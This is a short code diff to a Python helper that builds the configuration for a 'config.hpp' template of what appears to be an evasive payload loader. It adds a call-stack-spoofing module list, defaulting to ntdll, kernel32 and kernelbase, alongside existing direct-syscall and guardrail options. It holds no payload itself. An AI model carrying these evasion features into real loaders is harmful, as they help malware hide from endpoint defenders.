@@ -20,7 +20,7 @@ template expects is a named kwarg, so forgetting one is a TypeError, not
 a silent None landing in the template.
 """
 
-from typing import Optional
+from typing import List, Optional
 
 
 def build_loader_config_data(
@@ -43,6 +43,7 @@ def build_loader_config_data(
     gr_block: Optional[dict] = None,
     syscall_backend: int = 0,
     callstack_spoof_enabled: int = 0,
+    callstack_spoof_modules: Optional[List[str]] = None,
 ) -> dict:
     """Assemble the `config_data` dict fed to the `config.hpp` template.
 
@@ -80,6 +81,8 @@ def build_loader_config_data(
         "GUARDRAILS_DECOY_FILE": guardrails_decoy_file,
         "SYSCALL_BACKEND": syscall_backend,
         "CALLSTACK_SPOOF_ENABLED": callstack_spoof_enabled,
+        "CALLSTACK_SPOOF_MODULES": list(callstack_spoof_modules or
+            ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]),
     }
     if gr_block:
         data.update(gr_block)
